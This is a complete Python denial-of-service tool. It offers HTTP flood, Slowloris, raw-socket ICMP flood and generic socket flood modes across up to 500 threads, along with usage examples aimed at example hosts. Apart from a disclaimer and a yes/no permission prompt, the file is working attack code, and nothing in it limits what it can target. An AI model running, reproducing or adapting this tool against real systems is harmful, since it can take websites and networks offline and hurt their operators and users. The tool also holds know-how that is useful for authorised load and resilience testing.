#!/usr/bin/env python3
"""
Advanced DoS Testing Tool - For Educational and Authorized Testing Only
WARNING: Unauthorized use against systems you don't own is ILLEGAL
"""

import socket
import threading
import time
import random
import sys
import argparse
import signal
import json
import logging
from datetime import datetime
from urllib.parse import urlparse
import ssl
import http.client
from concurrent.futures import ThreadPoolExecutor
import queue
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Configuration
MAX_THREADS = 500
MAX_CONNECTIONS_PER_SECOND = 100
DEFAULT_TIMEOUT = 5
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
]

class DoSAttack:
    """Main DoS attack class with multiple attack vectors"""
    
    def __init__(self, target_url, threads=100, duration=60, method='http_flood'):
        self.target_url = target_url
        self.threads = min(threads, MAX_THREADS)
        self.duration = duration
        self.method = method
        self.running = True
        self.stats = {
            'requests_sent': 0,
            'requests_successful': 0,
            'requests_failed': 0,
            'start_time': None,
            'end_time': None,
            'errors': []
        }
        self.lock = threading.Lock()
        self.parsed_url = urlparse(target_url)
        self.setup_logging()
        
    def setup_logging(self):
        """Configure logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('dos_test.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def create_session(self):
        """Create a requests session with retry strategy"""
        session = requests.Session()
        retry_strategy = Retry(
            total=0,  # Don't retry on failure for DoS
            backoff_factor=0,
            status_forcelist=[]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session
    
    def generate_payload(self):
        """Generate random payload for POST requests"""
        payloads = [
            {'data': 'x' * random.randint(100, 1000)},
            {'json': {'key': 'value' * random.randint(10, 50)}},
            {'files': {'file': ('test.txt', 'x' * 1024)}},
        ]
        return random.choice(payloads)
    
    def http_flood_attack(self, thread_id):
        """HTTP flood attack using requests library"""
        session = self.create_session()
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        while self.running and time.time() < self.stats['start_time'] + self.duration:
            try:
                # Randomize request parameters
                params = {f'param_{i}': random.randint(1, 1000) for i in range(random.randint(1, 5))}
                
                # Randomly choose GET or POST
                if random.random() < 0.3:  # 30% POST requests
                    payload = self.generate_payload()
                    response = session.post(
                        self.target_url,
                        params=params,
                        json=payload.get('json'),
                        data=payload.get('data'),
                        files=payload.get('files'),
                        headers=headers,
                        timeout=DEFAULT_TIMEOUT,
                        verify=False
                    )
                else:
                    response = session.get(
                        self.target_url,
                        params=params,
                        headers=headers,
                        timeout=DEFAULT_TIMEOUT,
                        verify=False
                    )
                
                with self.lock:
                    self.stats['requests_sent'] += 1
                    if 200 <= response.status_code < 400:
                        self.stats['requests_successful'] += 1
                    else:
                        self.stats['requests_failed'] += 1
                
                # Random delay to simulate realistic traffic
                time.sleep(random.uniform(0.001, 0.01))
                
            except requests.exceptions.RequestException as e:
                with self.lock:
                    self.stats['requests_failed'] += 1
                    if len(self.stats['errors']) < 100:  # Limit error logging
                        self.stats['errors'].append(str(e))
                time.sleep(0.01)
            except Exception as e:
                self.logger.error(f"Thread {thread_id} error: {e}")
                break
    
    def slowloris_attack(self, thread_id):
        """Slowloris attack - keep connections open"""
        while self.running and time.time() < self.stats['start_time'] + self.duration:
            try:
                # Create socket connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(DEFAULT_TIMEOUT)
                
                # Connect to target
                port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
                sock.connect((self.parsed_url.hostname, port))
                
                # If HTTPS, wrap with SSL
                if self.parsed_url.scheme == 'https':
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(sock, server_hostname=self.parsed_url.hostname)
                
                # Send incomplete HTTP request
                request = f"GET {self.parsed_url.path or '/'} HTTP/1.1\r\n"
                request += f"Host: {self.parsed_url.hostname}\r\n"
                request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                request += "Accept: */*\r\n"
                
                sock.send(request.encode('utf-8'))
                
                # Keep connection alive by sending partial headers
                while self.running and time.time() < self.stats['start_time'] + self.duration:
                    try:
                        # Send random header to keep connection alive
                        header = f"X-Header-{random.randint(1, 1000)}: {random.randint(1, 100000)}\r\n"
                        sock.send(header.encode('utf-8'))
                        
                        with self.lock:
                            self.stats['requests_sent'] += 1
                        
                        time.sleep(random.uniform(10, 30))  # Wait before sending next header
                    except (socket.error, socket.timeout):
                        break
                
                sock.close()
                
            except (socket.error, socket.timeout, ssl.SSLError) as e:
                with self.lock:
                    if len(self.stats['errors']) < 100:
                        self.stats['errors'].append(str(e))
                time.sleep(1)
            except Exception as e:
                self.logger.error(f"Slowloris thread {thread_id} error: {e}")
                break
    
    def icmp_flood(self, thread_id):
        """ICMP flood attack (requires root privileges)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(DEFAULT_TIMEOUT)
            
            packet = b'\x08\x00' + b'\x00\x00' + b'\x00\x00' + b'\x00\x00' + b'\x00' * 56
            target_ip = socket.gethostbyname(self.parsed_url.hostname)
            
            while self.running and time.time() < self.stats['start_time'] + self.duration:
                try:
                    sock.sendto(packet, (target_ip, 0))
                    with self.lock:
                        self.stats['requests_sent'] += 1
                    time.sleep(random.uniform(0.001, 0.005))
                except socket.error:
                    time.sleep(0.01)
                    
            sock.close()
            
        except PermissionError:
            self.logger.error("ICMP flood requires root privileges. Run with sudo.")
            self.running = False
        except Exception as e:
            self.logger.error(f"ICMP flood error: {e}")
    
    def generic_attack(self, thread_id):
        """Generic socket attack - floods with raw HTTP requests"""
        while self.running and time.time() < self.stats['start_time'] + self.duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
                sock.connect((self.parsed_url.hostname, port))
                
                if self.parsed_url.scheme == 'https':
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(sock, server_hostname=self.parsed_url.hostname)
                
                # Craft HTTP request
                request = f"GET {self.parsed_url.path or '/'} HTTP/1.1\r\n"
                request += f"Host: {self.parsed_url.hostname}\r\n"
                request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                request += "Accept: */*\r\n"
                request += "Connection: close\r\n"
                request += "\r\n"
                
                sock.send(request.encode('utf-8'))
                sock.recv(1024)  # Try to read response
                sock.close()
                
                with self.lock:
                    self.stats['requests_sent'] += 1
                    self.stats['requests_successful'] += 1
                
                time.sleep(random.uniform(0.001, 0.005))
                
            except (socket.error, socket.timeout, ssl.SSLError):
                with self.lock:
                    self.stats['requests_failed'] += 1
                time.sleep(0.01)
            except Exception as e:
                self.logger.error(f"Generic attack error: {e}")
                break
    
    def attack_worker(self, thread_id):
        """Worker function for attack threads"""
        attack_methods = {
            'http_flood': self.http_flood_attack,
            'slowloris': self.slowloris_attack,
            'icmp_flood': self.icmp_flood,
            'generic': self.generic_attack,
        }
        
        method = attack_methods.get(self.method, self.http_flood_attack)
        method(thread_id)
    
    def start_attack(self):
        """Start the DoS attack"""
        self.stats['start_time'] = time.time()
        self.logger.info(f"Starting {self.method} attack on {self.target_url}")
        self.logger.info(f"Threads: {self.threads}, Duration: {self.duration}s")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit tasks
            futures = []
            for i in range(self.threads):
                futures.append(executor.submit(self.attack_worker, i))
            
            # Monitor progress
            while self.running and time.time() < self.stats['start_time'] + self.duration:
                time.sleep(5)
                self.print_stats()
            
            self.running = False
            self.stats['end_time'] = time.time()
    
    def print_stats(self):
        """Print current statistics"""
        elapsed = time.time() - self.stats['start_time']
        total_requests = self.stats['requests_sent']
        success_rate = (self.stats['requests_successful'] / total_requests * 100) if total_requests > 0 else 0
        requests_per_second = total_requests / elapsed if elapsed > 0 else 0
        
        self.logger.info(f"\n{'='*50}")
        self.logger.info(f"Attack Statistics:")
        self.logger.info(f"Total Requests: {total_requests}")
        self.logger.info(f"Successful: {self.stats['requests_successful']}")
        self.logger.info(f"Failed: {self.stats['requests_failed']}")
        self.logger.info(f"Success Rate: {success_rate:.2f}%")
        self.logger.info(f"Requests/Second: {requests_per_second:.2f}")
        self.logger.info(f"Elapsed Time: {elapsed:.2f}s")
        self.logger.info(f"{'='*50}\n")
    
    def save_report(self):
        """Save attack report to file"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'target': self.target_url,
            'method': self.method,
            'threads': self.threads,
            'duration': self.duration,
            'stats': self.stats,
            'errors': self.stats['errors'][:10]  # Only first 10 errors
        }
        
        filename = f"dos_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        self.logger.info(f"Report saved to {filename}")
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        self.logger.info("Stopping attack...")
        self.stats['end_time'] = time.time()

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n\nAttack interrupted by user")
    sys.exit(0)

def validate_target(target):
    """Validate target URL"""
    try:
        parsed = urlparse(target)
        if not parsed.scheme:
            target = f"http://{target}"
        parsed = urlparse(target)
        if not parsed.hostname:
            raise ValueError("Invalid target URL")
        return target
    except Exception as e:
        raise ValueError(f"Invalid target URL: {e}")

def main():
    """Main function with argument parsing"""
    parser = argparse.ArgumentParser(
        description='Advanced DoS Testing Tool - For Educational Use Only',
        epilog='WARNING: Unauthorized use is illegal. Use only on systems you own.'
    )
    
    parser.add_argument('target', help='Target URL or IP address')
    parser.add_argument('-t', '--threads', type=int, default=100, 
                       help=f'Number of threads (max: {MAX_THREADS})')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help='Attack duration in seconds')
    parser.add_argument('-m', '--method', choices=['http_flood', 'slowloris', 'icmp_flood', 'generic'],
                       default='http_flood', help='Attack method')
    parser.add_argument('--verbose', action='store_true', 
                       help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Set signal handler for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        # Validate target
        target = validate_target(args.target)
        
        # Limit threads
        if args.threads > MAX_THREADS:
            print(f"Threads limited to {MAX_THREADS}")
            args.threads = MAX_THREADS
        
        # Print banner
        print("\n" + "="*60)
        print("ADVANCED DOS TESTING TOOL")
        print("FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY")
        print("="*60)
        print(f"Target: {target}")
        print(f"Method: {args.method}")
        print(f"Threads: {args.threads}")
        print(f"Duration: {args.duration}s")
        print("="*60 + "\n")
        
        # Confirm with user
        confirm = input("Are you sure you have permission to test this target? (yes/no): ")
        if confirm.lower() != 'yes':
            print("Attack cancelled.")
            sys.exit(0)
        
        # Create attack instance and start
        attack = DoSAttack(target, args.threads, args.duration, args.method)
        attack.start_attack()
        
        # Save report
        attack.save_report()
        
        # Final summary
        print("\nAttack completed!")
        print(f"Total requests sent: {attack.stats['requests_sent']}")
        print(f"Success rate: {(attack.stats['requests_successful'] / max(1, attack.stats['requests_sent']) * 100):.2f}%")
        print("Check dos_report_*.json for detailed statistics")
        
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()



# Basic HTTP flood attack
#python dos.py http://example.com -t 100 -d 60

# Slowloris attack
#python dos.py https://example.com -m slowloris -t 50 -d 120

# ICMP flood (requires sudo)
#sudo python dos.py 192.168.1.1 -m icmp_flood -t 10

# Generic socket attack
#python dos.py example.com -m generic -t 200 -d 30